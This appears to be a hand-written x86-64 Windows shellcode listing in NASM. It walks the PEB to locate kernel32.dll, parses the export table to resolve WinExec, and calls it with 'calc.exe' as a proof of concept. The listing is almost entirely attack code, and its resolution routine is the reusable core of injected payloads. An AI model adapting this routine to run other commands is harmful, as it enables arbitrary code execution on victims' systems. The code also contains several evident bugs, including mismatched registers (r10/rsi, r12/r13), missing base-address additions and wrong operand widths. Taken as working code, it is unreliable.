;https://www.felixcloutier.com/x86/lods:lodsb:lodsw:lodsd:lodsq

global _start

section .text
_start:

	; Find the kernel32.dll base address
	xor rcx, rcx                           ; zero rcx 
	mov rax, gs:[rcx + 0x60]               ; rax = PEB   fs is a segment reg pointing at TEB
	mov rax, [rax + 0x18]                  ; rax = PEB->LDR
	mov rsi, [rax + 0x20]                  ; rsi = PEB->LDR->InMemoryOrderModuleList linked list of loaded modules
	lodsq                                  ; rax = Second Module (generally ntdll.dll)
	xchg rsi, rax                          ; rsi = Second Module, rax = PEM->LDR->InMemOrd 
	lodsq                                  ; rax = Third Module (generally kernel32.dll)
	mov rbx, [rax + 0x20]                  ; rbx = DLLbase of kernel32.dll
	mov r8, rbx                            ; r8 = kernel32.dll base addr 
	xor rbx, rbx                           ; rbx = 0 

	; Find the export table of kernerl32.dll (Data Directory in PE header)
	; r8 = kernel32.dll base addr
	mov rdx, [r8 + 0x3c]                   ; rdx = e_lfanew in DOS header (rva)
	add rdx, r8                            ; rdx = PE header
	mov rdx, [rdx + 0x78]                  ; rdx = Data Directory[0] (rva) 
	add rdx, r8                            ; rdx = Data Directory[0] - which is export table 
	mov r10, [rdx + 0x20]                  ; rsi = Offset to Address of Names Table (rva)
	add rsi, r8                            ; rsi = Address of Names Array
	xor r9, r9
	mov r9, [rdx + 0x14]                   ; r9 = Number of Functions

	; Finding the WinExec Function Name
	; r8 = kernel32.dll base addr
	; r9 = Number of Functions 
	; r10 = Address of Names Array
	; rdx = Export Table
	; mov rcx, r9                            ; set rcx = Number of Functions
	xor rcx, rcx 
	;xor rax, rax                           ; rax = 0 
	;mov rax, 0x636578456e6957              ; rax = WinExec 
	push 0x636578456e6957              ; rax = WinExec 
	pop rax 

	Find_Function:
	xor rbx, rbx                           ; rbx = 0
	mov rbx, [r10+4+rcx*4]                 ; rbx = Address of Name (rva)
	inc rcx                                ; decrement counter
	cmp [rbx], rax                         ; Check if we found WinExec 
	jnz Find_Function                      ; if we did not find loop again

	; Find WinExec Function Addr
	; r8 = kernel32.dll base addr
	; r9 = Number of Functions 
	; r10 = Address of Names Array
	; rdx = Export Table
	; rcx = Index found 
	xor r11, r11                           ; r11 = 0
	mov r11, [rdx+0x24]                    ; r11 = Ordinals Array (rva)
	add r11, r8                            ; r11 = Ordinals Array 
	mov r12, [r11+rcx*2]                   ; r13 = Address of Name Ordinals + Counter, r13 = ordinal
	xor r11, r11                           ; r11 = 0
	mov r11, [rdx+0x1c]                    ; Address of Function Array (rva)
	add r11, r8                            ; r11 = Address of Function Array 
	mov rcx, [r11+r13*8]                   ; rcx = Address of WinExec (rva)
	add rcx, r8                            ; rcx = Address of WinExec 
	mov r9, rcx                            ; r9 = Address of WinExec 

	; Call WinExec 
	; r8 = kernel32.dll base addr
	; r13 = ordinal 
	; r9 = WinExec addr 
	xor rax, rax                           ; rax = 0
	push rax                               ; push 0 to stack 
	mov rax, 0x6578652e636c6163            ; rax = "calc.exe"
	push rax                               ; push "calc.exe" to stack
	mov rcx, rsp                           ; rcx -> "calc.exe"  (arg 1)
	xor rdx, rdx                           ; rdx = 0 
	inc rdx                                ; rdx = 1 (arg2)
	call r9                                ; call WinExec

